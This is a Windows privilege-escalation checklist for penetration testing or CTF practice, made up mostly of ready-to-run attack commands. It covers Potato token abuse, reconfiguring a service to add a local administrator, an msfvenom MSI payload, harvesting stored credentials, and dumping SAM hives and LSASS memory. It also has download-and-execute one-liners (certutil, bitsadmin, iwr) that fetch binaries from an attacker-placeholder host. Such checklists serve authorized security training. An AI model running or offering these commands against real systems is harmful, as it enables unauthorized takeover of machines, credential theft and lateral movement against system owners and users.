# Windows Privilege Escalation Checklist

You have a low-priv shell (or Meterpreter/Evil-WinRM). Goal: **NT AUTHORITY\SYSTEM**
or a local admin. Run automated scans first, then verify manually.
Cross-reference native Windows binaries against **LOLBAS → https://lolbas-project.github.io/**.

> If you only have a basic shell, get a better one: `evil-winrm`, RDP, or a
> reverse shell via `powershell -enc <base64>` / nc.exe.

---

## 0. Orientation

- [ ] Who am I, my privileges and groups
  ```cmd
  whoami /all
  whoami /priv
  whoami /groups
  ```
- [ ] System info / patch level / arch
  ```cmd
  systeminfo
  hostname
  echo %PROCESSOR_ARCHITECTURE%
  ```
- [ ] Local users & admins
  ```cmd
  net user
  net localgroup administrators
  ```

## 1. Automated enumeration (run at least one)

- [ ] **WinPEAS** (the big enumerator; choose x64/x86)
  ```cmd
  :: serve from attacker, then on target:
  winPEASx64.exe
  :: PowerShell variant: . .\winPeas.ps1
  ```
- [ ] **PowerUp** (hunts misconfig-based privesc specifically)
  ```powershell
  powershell -ep bypass
  . .\PowerUp.ps1
  Invoke-AllChecks
  ```
- [ ] **Seatbelt** (GhostPack; gathers system/user data for further analysis)
  ```cmd
  Seatbelt.exe -group=all
  ```
- [ ] **SharpUp** (C# PowerUp) as a second opinion
  ```cmd
  SharpUp.exe audit
  ```

## 2. Token privileges (whoami /priv) → "Potato" attacks

- [ ] Check `whoami /priv`. These enabled privileges = SYSTEM:
  - `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` →
    **Potato attacks**: `JuicyPotatoNG.exe`, `PrintSpoofer.exe`, `GodPotato.exe`,
    `RoguePotato.exe`. Common on service accounts / IIS / MSSQL.
    ```cmd
    PrintSpoofer64.exe -i -c cmd
    GodPotato.exe -cmd "cmd /c whoami"
    ```
  - `SeBackupPrivilege` / `SeRestorePrivilege` → read any file (e.g. SAM/SYSTEM hives,
    flags) via `robocopy /b` or `reg save`.
  - `SeDebugPrivilege` → dump LSASS / inject into a SYSTEM process (mimikatz).
  - `SeTakeOwnershipPrivilege` → take ownership of a sensitive file then read/replace it.
  - `SeLoadDriverPrivilege` → load a vulnerable driver.

## 3. Service misconfigurations

- [ ] Unquoted service paths (space in path + no quotes = plant a binary)
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
  ```
  → If `C:\Program Files\Some App\svc.exe` is unquoted and you can write to
    `C:\Program Files\`, drop `C:\Program.exe`. Then restart service / reboot.
- [ ] Weak service binary/folder permissions (you can overwrite the .exe)
  ```cmd
  :: PowerUp finds these as ModifiableServiceFile / ModifiableService
  accesschk.exe -uwcqv "Everyone" *        :: needs accesschk (Sysinternals)
  accesschk.exe -uwcqv "Authenticated Users" *
  ```
- [ ] Services you can reconfigure (change binPath to your payload)
  ```cmd
  sc qc <service>
  sc config <service> binpath= "cmd /c net localgroup administrators user /add"
  sc stop <service> && sc start <service>
  ```

## 4. Registry: AlwaysInstallElevated

- [ ] Both keys = 1 → install a malicious MSI as SYSTEM
  ```cmd
  reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
  → If both are 0x1:
  ```bash
  msfvenom -p windows/x64/exec CMD='net localgroup administrators user /add' -f msi -o eo.msi
  ```
  ```cmd
  msiexec /quiet /qn /i eo.msi
  ```

## 5. Scheduled tasks

- [ ] List tasks and look for ones running as SYSTEM/admin with a writable target
  ```cmd
  schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
  ```
  → Writable script/binary launched by a privileged task = overwrite it with your payload.

## 6. Stored credentials

- [ ] cmdkey saved credentials → `runas /savecred`
  ```cmd
  cmdkey /list
  runas /savecred /user:ADMIN "cmd /c whoami > C:\temp\o.txt"
  ```
- [ ] AutoLogon creds in registry (cleartext password!)
  ```cmd
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
  ```
- [ ] Unattended install / answer files
  ```cmd
  type C:\Windows\Panther\Unattend.xml
  type C:\Windows\Panther\Autounattend.xml
  type C:\Windows\System32\Sysprep\sysprep.xml
  ```
- [ ] Hunt files for passwords
  ```cmd
  findstr /si password *.txt *.ini *.config *.xml
  dir /s /b *pass* *cred* *.kdbx 2>nul
  ```
- [ ] **DPAPI** stored secrets (browser/RDP/cred manager) — collect blobs + masterkeys,
      decrypt with mimikatz / SharpDPAPI
  ```
  C:\Users\<u>\AppData\Roaming\Microsoft\Protect\<SID>\   (masterkeys)
  C:\Users\<u>\AppData\Local\Microsoft\Credentials\       (cred blobs)
  ```
  ```cmd
  SharpDPAPI.exe credentials
  ```

## 7. Credential dumping (once you have admin/SeDebug)

- [ ] SAM/SYSTEM/SECURITY hives → offline hash extraction
  ```cmd
  reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
  :: on attacker:  impacket-secretsdump -sam sam.hive -system system.hive LOCAL
  ```
- [ ] LSASS dump (mimikatz `sekurlsa::logonpasswords`, or comsvcs.dll via LOLBAS):
  ```cmd
  rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\l.dmp full
  ```

## 8. UAC bypass (if you're an admin user but not elevated / Medium IL)

- [ ] Confirm you're in a Medium-integrity admin context (`whoami /groups` shows
      "Medium Mandatory Level" + admin group). Then bypass UAC:
  - fodhelper.exe registry hijack, eventvwr.exe, computerdefaults.exe, sdclt.exe.
  - Tools: `Invoke-UACBypass` (PowerUp/UACME). Many of these binaries are on **LOLBAS**.

## 9. Useful built-in / LOLBAS commands

- [ ] Network & shares (find more targets / creds)
  ```cmd
  ipconfig /all & route print & arp -a
  netstat -ano
  net share & net use
  ```
- [ ] Installed software / running processes (vulnerable versions)
  ```cmd
  wmic product get name,version
  tasklist /v
  ```
- [ ] Living-off-the-land download/exec (when you lack tools) — full list on **LOLBAS**:
  ```cmd
  certutil -urlcache -f http://ATTACKER/x.exe x.exe
  bitsadmin /transfer j http://ATTACKER/x.exe C:\temp\x.exe
  powershell -c "iwr http://ATTACKER/x.exe -o x.exe"
  ```

## 10. Kernel / missing patches (last resort)

- [ ] Compare `systeminfo` against known exploits
  ```
  :: Windows Exploit Suggester - Next Generation
  wesng / Watson.exe / Sherlock.ps1
  ```
  Classics: PrintNightmare (CVE-2021-34527), HiveNightmare/SeriousSAM
  (CVE-2021-36934), CVE-2020-0796 SMBGhost, MS16-032.

---

## Workflow reminder

1. `whoami /priv` + `whoami /all` → run **WinPEAS** + **PowerUp** + **Seatbelt**.
2. Token privs (SeImpersonate → Potato) and service misconfigs are the most common wins.
3. For native binaries / download-exec, consult **https://lolbas-project.github.io/**.
4. Get SYSTEM, grab the flag, then dump SAM/LSASS for lateral movement.
